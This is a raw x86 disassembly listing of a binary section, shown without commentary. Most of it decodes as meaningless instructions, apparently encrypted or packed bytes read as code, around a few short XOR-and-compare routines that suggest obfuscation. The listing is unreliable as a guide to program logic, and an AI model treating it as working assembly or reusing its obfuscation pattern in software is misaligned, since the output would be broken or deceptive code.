  40abb9:	arpl   WORD PTR [ecx-0x37],dx
  40abbc:	call   0x34ce1aaf
  40abc1:	std    
  40abc2:	jge    0x40abd2
  40abc4:	fldenv [edi+0x70]
  40abc7:	add    eax,0xed37b5f3
  40abcc:	lock test eax,0xeac849b0
  40abd2:	lahf   
  40abd3:	das    
  40abd4:	push   0xffffffab
  40abd6:	sbb    ebp,DWORD PTR [edx]
  40abd8:	inc    edx
  40abd9:	jmp    0x106b:0x3b98ded3
  40abe0:	jg     0x40ab65
  40abe2:	out    0x79,al
  40abe4:	xchg   ecx,eax
  40abe5:	xlat   BYTE PTR ds:[ebx]
  40abe6:	clc    
  40abe7:	js     0xc8c28179
  40abed:	jne    0x40ac5f
  40abef:	test   BYTE PTR [esi+0x6],0xcb
  40abf3:	add    al,0x75
  40abf5:	addr16 xor dl,0x5
  40abf9:	and    DWORD PTR ds:0xea8b4728,edi
  40abff:	mov    esp,0xa50edc3b
  40ac04:	add    al,0x7d
  40ac06:	in     eax,0xe6
  40ac08:	int3   
  40ac09:	push   edi
  40ac0a:	cmovae edi,DWORD PTR [esi+0x3700231f]
  40ac11:	pop    esp
  40ac12:	adc    DWORD PTR [ebx+0x4b],esp
  40ac15:	stos   DWORD PTR es:[edi],eax
  40ac16:	pop    ecx
  40ac17:	nop
  40ac18:	(bad)  
  40ac19:	add    al,0xa4
  40ac1b:	inc    eax
  40ac1c:	adc    DWORD PTR [ecx+0x79],esp
  40ac1f:	in     eax,dx
  40ac20:	cdq    
  40ac21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac22:	mov    bl,0xdf
  40ac24:	outs   dx,DWORD PTR ds:[esi]
  40ac25:	xchg   BYTE PTR [edx],dh
  40ac27:	(bad)  
  40ac29:	cmc    
  40ac2a:	xchg   edi,eax
  40ac2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac2c:	test   eax,0x36ef3d90
  40ac31:	in     eax,dx
  40ac32:	mov    ch,0x6d
  40ac34:	xchg   edx,eax
  40ac35:	mov    esp,0xdbc03e85
  40ac3a:	in     eax,dx
  40ac3b:	out    dx,al
  40ac3c:	jne    0x40aca4
  40ac3e:	pop    esp
  40ac3f:	lods   al,BYTE PTR ds:[esi]
  40ac40:	xchg   ebp,eax
  40ac41:	sub    al,0x48
  40ac43:	in     eax,0xa9
  40ac45:	outs   dx,BYTE PTR ds:[esi]
  40ac46:	stos   DWORD PTR es:[edi],eax
  40ac47:	mov    bl,0x29
  40ac49:	inc    esp
  40ac4a:	inc    si
  40ac4c:	ret    0xb056
  40ac4f:	cmp    eax,0x9bd779b1
  40ac54:	push   esi
  40ac55:	sar    BYTE PTR [ecx+esi*8+0x2ee01afb],1
  40ac5c:	inc    edx
  40ac5d:	sbb    cl,0x2a
  40ac60:	out    0x9,al
  40ac62:	ror    ebx,0x2e
  40ac65:	ficom  WORD PTR [edx+0x4488468c]
  40ac6b:	adc    dl,BYTE PTR [ecx+0x57]
  40ac6e:	cmc    
  40ac6f:	popa   
  40ac70:	mov    ch,0x40
  40ac72:	jne    0x40aca0
  40ac74:	and    al,0xea
  40ac76:	sub    BYTE PTR [eax],0xfb
  40ac79:	mov    bh,0x18
  40ac7b:	xchg   DWORD PTR [ebx+0x2a14b161],ecx
  40ac81:	in     al,dx
  40ac82:	(bad)  [eax+esi*8]
  40ac85:	mov    bl,BYTE PTR [ecx-0x4cb12dc6]
  40ac8b:	in     al,0xac
  40ac8d:	dec    eax
  40ac8e:	xchg   esi,eax
  40ac8f:	arpl   WORD PTR [esi],dx
  40ac91:	das    
  40ac92:	sbb    eax,DWORD PTR [ebp+edi*1+0xcfb75c7]
  40ac99:	pop    esi
  40ac9a:	outs   dx,BYTE PTR ds:[esi]
  40ac9b:	or     esi,DWORD PTR [ecx]
  40ac9d:	jnp    0x40ac74
  40ac9f:	shl    BYTE PTR [ebx+ebx*4-0x4f],cl
  40aca3:	jmp    0x40accd
  40aca5:	inc    ecx
  40aca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aca7:	fsubp  st(5),st
  40aca9:	fsub   DWORD PTR [ecx-0x69]
  40acac:	dec    ebp
  40acad:	fnstsw WORD PTR ds:0x9af18532
  40acb3:	pop    eax
  40acb4:	int3   
  40acb5:	or     BYTE PTR [edi],al
  40acb7:	pop    esp
  40acb8:	inc    edx
  40acb9:	adc    bl,BYTE PTR [eax]
  40acbb:	cmp    DWORD PTR [edi],esi
  40acbd:	loopne 0x40ac84
  40acbf:	cmp    al,0x59
  40acc1:	inc    ebp
  40acc2:	es xchg esp,eax
  40acc4:	pop    ebp
  40acc5:	sub    esi,DWORD PTR [ebx+esi*1+0x1e]
  40acc9:	stc    
  40acca:	pop    eax
  40accb:	pop    esp
  40accc:	adc    dh,BYTE PTR ds:0x6189268b
  40acd2:	jae    0x40ac7f
  40acd4:	aam    0xc4
  40acd6:	or     al,0x18
  40acd8:	xor    al,BYTE PTR [ecx]
  40acda:	repz sbb WORD PTR [edi+0x58],bp
  40acdf:	and    ecx,DWORD PTR [esi+esi*8+0x7c1c4865]
  40ace6:	je     0x40ad03
  40ace8:	push   esi
  40ace9:	mov    dh,0x6f
  40aceb:	xor    dl,BYTE PTR [esi]
  40aced:	jmp    0x57af:0xe8dd216
  40acf4:	out    0x80,al
  40acf6:	out    0xe2,eax
  40acf8:	dec    ebx
  40acf9:	js     0x40acb3
  40acfb:	cmp    BYTE PTR [edi],al
  40acfd:	cmc    
  40acfe:	cwde   
  40acff:	and    eax,0xba4a0205
  40ad04:	pushf  
  40ad05:	mov    ds:0xc19cb7bf,eax
  40ad0a:	push   ebx
  40ad0b:	cwde   
  40ad0c:	in     al,0xfa
  40ad0e:	cs inc edx
  40ad10:	inc    esi
  40ad11:	stos   DWORD PTR es:[edi],eax
  40ad12:	sbb    edi,DWORD PTR [eax+0x20]
  40ad15:	xor    DWORD PTR [edi-0x2fa6be3d],ebx
  40ad1b:	fnstsw WORD PTR [ecx]
  40ad1d:	mov    DWORD PTR [eax+edx*8+0x66efc103],0x48b8450b
  40ad28:	aaa    
  40ad29:	je     0x40ad3f
  40ad2b:	lods   al,BYTE PTR ds:[esi]
  40ad2c:	xchg   ebx,eax
  40ad2d:	cdq    
  40ad2e:	rol    ebp,1
  40ad30:	ror    DWORD PTR [edi],0x2
  40ad33:	xor    eax,0xcafdefda
  40ad38:	sahf   
  40ad39:	add    eax,ecx
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x4e5761c7]
  40ad81:	push   0x7e7ef300
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	adc    ebx,DWORD PTR [esi-0x65]
  40ad8d:	bound  esp,QWORD PTR [edx+0x2b45330a]
  40ad93:	test   DWORD PTR [ebp-0x267349f3],edi
  40ad99:	push   esi
  40ad9a:	jo     0x40adcd
  40ad9c:	popf   
  40ad9d:	add    edi,edx
  40ad9f:	push   cs
  40ada0:	add    al,0xad
  40ada2:	repnz lea ecx,[ecx]
  40ada5:	int3   
  40ada6:	sbb    bh,BYTE PTR [ebp+0x332bd5dc]
  40adac:	out    dx,eax
  40adad:	add    ch,BYTE PTR [ebx+0x78307bd3]
  40adb3:	lods   eax,DWORD PTR ds:[esi]
  40adb4:	or     DWORD PTR [esi],edi
  40adb6:	stos   BYTE PTR es:[edi],al
  40adb7:	or     BYTE PTR [ecx+0x6a],al
  40adba:	pushf  
  40adbb:	mov    ds:0xb7795369,eax
  40adc0:	jae    0x40add5
  40adc2:	dec    ecx
  40adc3:	jno    0x40ad6e
  40adc5:	adc    cl,BYTE PTR [ecx+0x4f]
  40adc8:	js     0x40ae35
  40adca:	mov    dh,0xb9
  40adcc:	mov    WORD PTR [ebx+0x763f9cf8],fs
  40add2:	cmc    
  40add3:	pop    ecx
  40add4:	dec    esp
  40add5:	mov    bl,0xf2
  40add7:	add    DWORD PTR [eax],esi
  40add9:	int    0x70
  40addb:	xchg   ebx,eax
  40addc:	shrd   DWORD PTR [ebx-0x703a7d64],ebp,0x6a
  40ade4:	mov    edx,0xe07b823
  40ade9:	adc    al,bl
  40adeb:	jbe    0x40adbc
  40aded:	inc    ecx
  40adee:	scas   al,BYTE PTR es:[edi]
  40adef:	(bad)  
  40adf1:	mov    dh,0x35
  40adf3:	mov    al,ds:0x5e0b24c2
  40adf8:	enter  0x1dec,0xd9
  40adfc:	faddp  st(7),st
  40adfe:	mov    esp,0xa86a5952
  40ae03:	pop    edx
  40ae04:	cmp    al,0xdb
  40ae06:	test   DWORD PTR [eax+0x0],edx
  40ae09:	in     al,dx
  40ae0a:	stos   BYTE PTR es:[edi],al
  40ae0b:	es jno 0x40ae55
  40ae0e:	fistp  QWORD PTR [esi+0x54]
  40ae11:	jecxz  0x40ae61
  40ae13:	push   ds
  40ae14:	cmp    eax,0x5a7b1fa9
  40ae19:	or     DWORD PTR [ebx-0x269dc525],0x49ea2061
  40ae23:	cmp    ecx,edx
  40ae25:	mov    edx,0xbc507ad6
  40ae2a:	add    esp,DWORD PTR [esi+0x51]
  40ae2d:	adc    esp,eax
  40ae2f:	pushf  
  40ae30:	inc    ecx
  40ae31:	mov    eax,ebx
  40ae33:	fsub   QWORD PTR [eax+0x0]
  40ae36:	mov    ch,0x81
  40ae38:	nop
  40ae39:	outs   dx,BYTE PTR ds:[esi]
  40ae3a:	or     ebx,DWORD PTR [eax-0x63]
  40ae3d:	add    BYTE PTR [edi-0x4c7234d6],0x12
  40ae44:	ret    
  40ae45:	inc    eax
  40ae46:	inc    esi
  40ae47:	ja     0x40aebc
  40ae49:	leave  
  40ae4a:	ds icebp 
  40ae4c:	(bad)  
  40ae4d:	ficom  WORD PTR [eax+0x52cfd2e3]
  40ae53:	adc    eax,0x89c0692f
  40ae58:	xchg   esp,eax
  40ae59:	fwait
  40ae5a:	xchg   BYTE PTR [ebp+eax*2+0x72],cl
  40ae5e:	or     BYTE PTR [ebx+0x4d14ff88],dl
  40ae64:	mov    esi,0xdb5f425b
  40ae69:	cmp    BYTE PTR [edi+ebp*4-0x344f9c0a],ah
  40ae70:	mov    bh,0x28
  40ae72:	ins    BYTE PTR es:[edi],dx
  40ae73:	out    dx,eax
  40ae74:	and    ebp,DWORD PTR [edi+ecx*8+0x14]
  40ae78:	sbb    BYTE PTR [edi-0xf28e288],al
  40ae7e:	sbb    DWORD PTR [ebx+0x53],eax
  40ae81:	xor    eax,0xbe2e5639
  40ae86:	lahf   
  40ae87:	in     eax,dx
  40ae88:	inc    esp
  40ae89:	(bad)  
  40ae8a:	mov    dl,BYTE PTR [eax+0x27]
  40ae8d:	jecxz  0x40aee5
  40ae8f:	in     eax,0x34
  40ae91:	adc    dl,bh
  40ae93:	xchg   edi,eax
  40ae94:	bound  edi,QWORD PTR [ebp-0x194cc825]
  40ae9a:	pop    ecx
  40ae9b:	nop
  40ae9c:	jg     0x40af19
  40ae9e:	ret    
  40ae9f:	out    dx,al
  40aea0:	outs   dx,BYTE PTR ds:[esi]
  40aea1:	xchg   ebx,eax
  40aea2:	pop    esp
  40aea3:	lods   al,BYTE PTR ds:[esi]
  40aea4:	jmp    0x682c:0xe0e01066
  40aeab:	loopne 0x40ae8b
  40aead:	ins    BYTE PTR es:[edi],dx
  40aeae:	jnp    0x40ae7a
  40aeb0:	mov    edx,0x44f56c1c
  40aeb5:	inc    esp
  40aeb6:	test   eax,0xa6127500
  40aebb:	pop    esi
  40aebc:	loopne 0x40ae8d
  40aebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebf:	pop    ds
  40aec0:	xchg   edi,eax
  40aec1:	sbb    bh,0x9b
  40aec4:	mov    ah,0xdc
  40aec6:	dec    ebp
  40aec7:	call   0x5c711c9b
  40aecc:	mov    ah,0x5d
  40aece:	je     0x40aedd
  40aed0:	cmp    DWORD PTR [ebx+0x5fb4373a],esi
  40aed6:	cmp    esp,DWORD PTR [ecx+ebp*1-0x18b4b94d]
  40aedd:	sbb    BYTE PTR [edx-0x1fa1101],al
  40aee3:	xchg   esi,edx
  40aee5:	(bad)  
  40aee7:	out    dx,eax
  40aee8:	mov    al,0x4a
  40aeea:	or     al,0x9
  40aeec:	pop    edx
  40aeed:	xchg   DWORD PTR [ecx+0x25],esp
  40aef0:	(bad)  
  40aef1:	jne    0x40af60
  40aef3:	das    
  40aef4:	mov    edi,DWORD PTR [ecx-0x44]
  40aef7:	(bad)  
  40aef8:	std    
  40aef9:	jno    0x40af1f
  40aefb:	ret    
  40aefc:	mov    eax,0xb75d0232
  40af01:	push   cs
  40af02:	push   es
  40af03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af04:	mov    esp,0xd0d8459a
  40af09:	leave  
  40af0a:	out    0x67,al
  40af0c:	sub    ebp,DWORD PTR [edx+0x59]
  40af0f:	not    BYTE PTR [ecx+0x42190e38]
  40af15:	fisub  DWORD PTR [edx-0x7aaa1456]
  40af1b:	push   ecx
  40af1c:	mov    DWORD PTR [eax-0xd],edx
  40af1f:	push   edx
  40af20:	jmp    0x657c:0xea5b70de
  40af27:	inc    ecx
  40af28:	je     0x40af17
  40af2a:	in     eax,dx
  40af2b:	xlat   BYTE PTR ds:[ebx]
  40af2d:	in     eax,dx
  40af2e:	mov    ecx,0xcfce5f1a
  40af33:	ja     0x40af55
  40af35:	cld    
  40af36:	add    BYTE PTR [ecx+0x1f04706],cl
  40af3c:	jo     0x40afbc
  40af3e:	jecxz  0x40af0b
  40af40:	mov    ecx,0xd76cee11
  40af45:	mov    al,bh
  40af47:	retf   
  40af48:	rcr    DWORD PTR [ebp+0x3c7e15c4],cl
  40af4e:	cmp    DWORD PTR [edx+0x32731731],eax
  40af54:	cmp    al,BYTE PTR [edi+edi*1+0x1cba1056]
  40af5b:	cmp    bl,BYTE PTR [esp+ebp*1+0x42045be0]
  40af62:	rcl    bl,0xb5
  40af65:	adc    BYTE PTR [ebp+0x5c44af97],ch
  40af6b:	jp     0x40afad
  40af6d:	inc    edx
  40af6e:	(bad)  
  40af6f:	fnsave [ecx-0x20]
  40af72:	mov    al,ds:0xd0b9ebbe
  40af77:	fwait
  40af78:	loope  0x40afee
  40af7a:	cs dec edx
  40af7c:	jbe    0x40af8e
  40af7e:	dec    eax
  40af7f:	or     ecx,ebx
  40af81:	les    ecx,FWORD PTR [edx+0x70]
  40af84:	int3   
  40af85:	cmp    ch,al
  40af87:	pop    cx
  40af89:	popf   
  40af8a:	fist   WORD PTR [eiz*4+0x5c8784ab]
  40af91:	inc    eax
  40af92:	enter  0x8cb5,0x2d
  40af96:	pushf  
  40af97:	xchg   esp,eax
  40af98:	nop
  40af99:	mov    esp,DWORD PTR [edx-0x4]
  40af9c:	mov    dl,0x43
  40af9e:	push   0xcdd7624a
  40afa3:	(bad)  
  40afa4:	dec    edx
  40afa5:	arpl   bx,si
  40afa7:	inc    ebx
  40afa8:	das    
  40afa9:	fbld   TBYTE PTR [ebx+esi*2+0x26044cda]
  40afb0:	adc    DWORD PTR [ebp+0x9fbeeab],esp
  40afb6:	repz rcr DWORD PTR [edi],0x29
  40afba:	(bad)  
  40afbc:	or     ch,BYTE PTR [edx-0x3c]
  40afbf:	sub    bl,BYTE PTR [edi-0x69]
  40afc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc3:	mov    dl,0x66
  40afc5:	jnp    0x40af67
  40afc7:	mov    edi,0x591ac61f
  40afcc:	and    dl,BYTE PTR [edx]
  40afce:	retf   
  40afcf:	pop    ebp
  40afd0:	cmp    BYTE PTR [ebx],al
  40afd2:	in     al,0x75
  40afd4:	loop   0x40afd1
  40afd6:	add    dl,BYTE PTR [ebx-0x43d780e9]
  40afdc:	sub    al,0xf6
  40afde:	add    DWORD PTR ds:0x695b5f05,0xb45107aa
  40afe8:	fist   WORD PTR [eax+0x1721b382]
  40afee:	mov    dl,BYTE PTR [ebp+0xb]
  40aff1:	leave  
  40aff2:	fucomp st(2)
  40aff4:	mov    ah,0xe8
  40aff6:	mov    ch,0x46
  40aff8:	xor    ah,BYTE PTR [edi-0x6c]
  40affb:	push   ecx
  40affc:	push   0x42
  40affe:	dec    edi
  40afff:	mov    edi,0x637f0e2f
  40b004:	mov    ecx,0xb6b5e8d3
  40b009:	sbb    edx,edi
  40b00b:	retf   
  40b00c:	xor    esp,DWORD PTR [ecx-0x7]
  40b00f:	jmp    0x40b013
  40b011:	mov    edi,0xa7a98f85
  40b016:	add    DWORD PTR [edi],ebp
  40b018:	jg     0x40b03c
  40b01a:	sub    eax,0x350a5f56
  40b01f:	(bad)  
  40b020:	imul   esp,ebx,0x34e1bb48
  40b026:	mov    ds:0x5679f34d,al
  40b02b:	js     0x40b064
  40b02d:	or     ah,dh
  40b02f:	int3   
  40b030:	jmp    0xf8527057
  40b035:	loopne 0x40b076
  40b037:	inc    ecx
  40b038:	hlt    
  40b039:	push   ds
  40b03a:	push   ebx
  40b03b:	std    
  40b03c:	aad    0xb0
  40b03e:	rol    BYTE PTR [ebp+0x73e7653d],0xf7
  40b045:	add    edi,DWORD PTR [esi-0x6e1712ae]
  40b04b:	jo     0x40b0af
  40b04d:	sbb    al,0x47
  40b04f:	cmp    BYTE PTR [edx-0x5b3eef1c],dl
  40b055:	es std 
  40b057:	(bad)  
  40b059:	or     al,0x9a
  40b05b:	push   ds
  40b05c:	imul   ebp,ebx,0x82f9f6db
  40b062:	jmp    0x217f6b00
  40b067:	shl    BYTE PTR [esi+0x2de73fc8],cl
  40b06d:	fdivr  st(4),st
  40b06f:	pop    edi
  40b070:	sar    DWORD PTR [ebx],cl
  40b072:	mov    ds:0x66a1f427,eax
  40b077:	aaa    
  40b078:	mov    eax,0x5ca5e6c9
  40b07d:	sub    al,0x97
  40b07f:	sbb    DWORD PTR [ebp-0x368fccea],ebp
  40b085:	pop    ebp
  40b086:	ja     0x40b02f
  40b088:	cmp    cl,BYTE PTR [eiz*1-0x74af3076]
  40b08f:	inc    ebp
  40b090:	loopne 0x40b01d
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	sahf   
  40b0ba:	dec    edi
  40b0bb:	mov    eax,ds:0x7efe0c15
  40b0c0:	jle    0x40b13c
  40b0c2:	jge    0x40b142
  40b0c4:	jle    0x40b05f
  40b0c6:	jle    0x40b0e6
  40b0c8:	ins    DWORD PTR es:[edi],dx
  40b0c9:	sbb    DWORD PTR [eax],ecx
  40b0cb:	push   0x7f
  40b0cd:	push   esi
  40b0ce:	or     eax,0x7324afc
  40b0d3:	sbb    DWORD PTR [ebx-0x5b],0x4e
  40b0d7:	sbb    esp,DWORD PTR [ecx+eiz*1]
  40b0da:	ret    
  40b0db:	lahf   
  40b0dc:	inc    edx
  40b0dd:	mov    ebx,0xe4b4b219
  40b0e2:	cli    
  40b0e3:	lods   al,BYTE PTR ds:[esi]
  40b0e4:	push   0x3e
  40b0e6:	in     al,0xbb
  40b0e8:	lea    esi,[edx]
  40b0ea:	xor    eax,0xd0ef8388
  40b0ef:	mov    dh,BYTE PTR [esi+0x21]
  40b0f2:	xchg   ebx,eax
  40b0f3:	add    ah,BYTE PTR [edi]
  40b0f5:	lods   eax,DWORD PTR ds:[esi]
  40b0f6:	outs   dx,BYTE PTR ds:[esi]
  40b0f7:	sar    BYTE PTR gs:[edi],cl
  40b0fa:	scas   eax,DWORD PTR es:[edi]
  40b0fb:	sub    dl,BYTE PTR [ecx-0x77]
  40b0fe:	mov    edx,DWORD PTR [ecx-0x7492cf5e]
  40b104:	sbb    ah,BYTE PTR [ecx+0x39d0f17c]
  40b10a:	enter  0x5d53,0xb4
  40b10e:	mov    es,WORD PTR [ecx-0x282560bc]
  40b114:	ftst   
  40b116:	out    0x98,al
  40b118:	call   0x9543:0x96c3e245
  40b11f:	jb     0x40b149
  40b121:	js     0x40b143
  40b123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b124:	push   0x18
  40b126:	jg     0x40b18f
  40b128:	arpl   WORD PTR [ebp+0x5dbb81d0],sp
  40b12e:	sub    ch,BYTE PTR [esi+0x46]
  40b131:	mov    bl,0x72
  40b133:	add    BYTE PTR [ebx],0x2a
  40b136:	xchg   edx,eax
  40b137:	sti    
  40b138:	std    
  40b139:	mov    ds:0xdcb9b27b,eax
  40b13e:	test   ecx,ebp
  40b140:	stos   DWORD PTR es:[edi],eax
  40b141:	cmp    dh,cl
  40b143:	aam    0xd9
  40b145:	inc    edi
  40b146:	data16 out 0x3f,al
  40b149:	mov    DWORD PTR [edi+0x14],esp
  40b14c:	adc    dl,BYTE PTR [edi+0x4]
  40b14f:	sbb    eax,0xa505447a
  40b154:	jb     0x40b13c
  40b156:	pop    ebx
  40b157:	adc    ecx,esi
  40b159:	stos   BYTE PTR es:[edi],al
  40b15a:	jl     0x40b1b1
  40b15c:	xor    DWORD PTR [edx+0x5ad96d89],edi
  40b162:	retf   0xc5e7
  40b165:	mov    ebp,0xee628eb8
  40b16a:	jl     0x40b1b9
  40b16c:	mov    ebx,0x61ef0762
  40b171:	push   es
  40b172:	add    al,0xca
  40b174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b175:	adc    ecx,DWORD PTR [ebx+0x75]
  40b178:	add    BYTE PTR [ecx],bl
  40b17a:	in     eax,0xa5
  40b17c:	mov    edi,0x98cffd81
  40b181:	pop    edx
  40b182:	pusha  
  40b183:	int3   
  40b184:	dec    esp
  40b185:	and    DWORD PTR [edx-0x40],eax
  40b188:	push   0xe484f57e
  40b18d:	xor    dl,bh
  40b18f:	scas   al,BYTE PTR es:[edi]
  40b190:	pushf  
  40b191:	scas   al,BYTE PTR es:[edi]
  40b192:	js     0x40b198
  40b194:	ins    DWORD PTR es:[edi],dx
  40b195:	pop    ebx
  40b196:	mov    esi,0x6bb6f5bc
  40b19b:	test   bh,bh
  40b19d:	dec    edx
  40b19e:	mov    ?,WORD PTR [eax]
  40b1a0:	cmp    ebp,DWORD PTR [ebp-0x66]
  40b1a3:	mov    bh,0x65
  40b1a5:	in     eax,dx
  40b1a6:	or     BYTE PTR [ebx+0x6],cl
  40b1a9:	push   edi
  40b1aa:	fmul   QWORD PTR [esi+0x27e0ab5e]
  40b1b0:	xchg   esi,eax
  40b1b1:	in     al,0xc6
  40b1b3:	sbb    BYTE PTR [edi-0x1abbcfed],bh
  40b1b9:	call   0x42324021
  40b1be:	xchg   esi,eax
  40b1bf:	adc    eax,0x4e94f7b7
  40b1c4:	lods   eax,DWORD PTR ds:[esi]
  40b1c5:	mov    ah,0xd9
  40b1c7:	popf   
  40b1c8:	fmul   QWORD PTR [eax]
  40b1ca:	imul   esp,esi,0xac313d0a
  40b1d0:	push   ss
  40b1d1:	mov    esi,0x3b05bd84
  40b1d6:	dec    esi
  40b1d7:	movhps xmm7,QWORD PTR [esi]
  40b1da:	sti    
  40b1db:	mov    esi,0xe8e81221
  40b1e0:	or     esp,edx
  40b1e2:	pop    edi
  40b1e3:	or     al,BYTE PTR [ebx-0x66]
  40b1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1e7:	lods   al,BYTE PTR ds:[esi]
  40b1e8:	in     al,0xa1
  40b1ea:	js     0x40b1bc
  40b1ec:	sbb    al,0xa3
  40b1ee:	inc    edi
  40b1ef:	aaa    
  40b1f0:	xchg   edx,eax
  40b1f1:	das    
  40b1f2:	lahf   
  40b1f3:	mov    dl,0xa7
  40b1f5:	dec    edx
  40b1f6:	mov    dh,0xc0
  40b1f8:	loopne 0x40b22f
  40b1fa:	xchg   ecx,eax
  40b1fb:	and    DWORD PTR [edx],eax
  40b1fd:	call   0xe0de:0xf29ec03
  40b204:	mov    bh,0x5e
  40b206:	mov    dl,0x6a
  40b208:	xor    bl,BYTE PTR [ebp+0x4db0938d]
  40b20e:	stos   BYTE PTR es:[edi],al
  40b20f:	shl    BYTE PTR [ebx+0x2d],cl
  40b212:	push   esi
  40b213:	sub    DWORD PTR [esi+0x127b7dfb],ebx
  40b219:	pop    ds
  40b21a:	call   0x8e8a8eee
  40b21f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b220:	loop   0x40b200
  40b222:	jle    0x40b236
  40b224:	nop
  40b225:	(bad)  
  40b226:	(bad)  [eax]
  40b228:	mov    ebx,esi
  40b22a:	stos   BYTE PTR es:[edi],al
  40b22b:	xchg   ecx,eax
  40b22c:	inc    esi
  40b22d:	fnstenv [ebp+0x7492cc3]
  40b233:	loop   0x40b1eb
  40b235:	lods   al,BYTE PTR ds:[esi]
  40b237:	pop    eax
  40b238:	(bad)  
  40b239:	jmp    0xf636:0x3b175b4c
  40b240:	lea    ebx,[esi]
  40b242:	add    bh,BYTE PTR [ebx+eax*1+0x6f8eb400]
  40b249:	les    edi,FWORD PTR [esi+0x1]
  40b24c:	jae    0x40b254
  40b24e:	xor    ebx,DWORD PTR [ecx]
  40b250:	out    dx,al
  40b251:	jp     0x40b240
  40b253:	push   ds
  40b254:	or     eax,0x6aab1584
  40b259:	sub    ebp,DWORD PTR [ebp-0x8fb22ea]
  40b25f:	jmp    0x40b1e1
  40b261:	popf   
  40b262:	xor    eax,0xf843b827
  40b267:	mov    ebp,0xe0180462
  40b26c:	ret    
  40b26d:	xor    eax,0x20103c28
  40b272:	and    ebx,0xffffffde
  40b275:	les    edx,FWORD PTR [eax+0x53]
  40b278:	outs   dx,DWORD PTR ds:[esi]
  40b279:	or     bh,bl
  40b27b:	or     dh,dh
  40b27d:	jle    0x40b265
  40b27f:	in     al,dx
  40b280:	aad    0x82
  40b282:	xor    esp,esi
  40b284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b285:	jmp    0x91a3c3f8
  40b28a:	or     DWORD PTR [esi],0x18546b6e
  40b290:	pushf  
  40b291:	stos   BYTE PTR es:[edi],al
  40b292:	cdq    
  40b293:	adc    eax,0x391c97db
  40b298:	jno    0x40b21a
  40b29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b29b:	(bad)  
  40b29c:	in     al,0xcc
  40b29e:	fld    QWORD PTR ds:0x7e83e006
  40b2a4:	jle    0x40b2b4
  40b2a6:	jecxz  0x40b29b
  40b2a8:	adc    edx,DWORD PTR [ecx]
  40b2aa:	loop   0x40b286
  40b2ac:	fld    DWORD PTR [edi+0x75]
  40b2af:	ja     0x40b2eb
  40b2b1:	in     eax,dx
  40b2b2:	push   esp
  40b2b3:	and    BYTE PTR [eax-0x5f396c17],dh
  40b2b9:	xor    BYTE PTR [esi-0x40],dh
  40b2bc:	arpl   WORD PTR [edx],ax
  40b2be:	pushf  
  40b2bf:	mov    bh,0x4c
  40b2c1:	xor    BYTE PTR [edx],0xae
  40b2c4:	sub    BYTE PTR [ebp+0x26],0xc8
  40b2c8:	loope  0x40b24e
  40b2ca:	jne    0x40b2e0
  40b2cc:	pop    ecx
  40b2cd:	mov    edi,0x9b02b732
  40b2d2:	test   DWORD PTR [ebx+ecx*8-0x32c9fb40],0xd0cd21fa
  40b2dd:	jp     0x40b272
  40b2df:	add    al,0xe2
  40b2e1:	adc    al,0x12
  40b2e3:	clc    
  40b2e4:	jno    0x40b322
  40b2e6:	xchg   ecx,eax
  40b2e7:	cld    
  40b2e8:	xchg   ebp,eax
  40b2e9:	inc    ebp
  40b2ea:	(bad)  
  40b2eb:	ror    BYTE PTR [ecx],cl
  40b2ed:	xchg   esp,eax
  40b2ee:	mov    al,0xa2
  40b2f0:	test   eax,0x636f9dc6
  40b2f5:	xlat   BYTE PTR ds:[ebx]
  40b2f6:	fnsave [ebx+esi*2-0x5058cbe3]
  40b2fd:	pushf  
  40b2fe:	aam    0x90
  40b300:	add    al,0xfe
  40b302:	in     al,dx
  40b303:	neg    DWORD PTR [ebp-0x2c]
  40b306:	push   edx
  40b307:	icebp  
  40b308:	pop    es
  40b309:	mov    ds:0x3e3d5231,eax
  40b30e:	clc    
  40b30f:	xchg   BYTE PTR [esi+0x5d],dh
  40b312:	leave  
  40b313:	or     eax,DWORD PTR [eax-0x22]
  40b316:	retf   
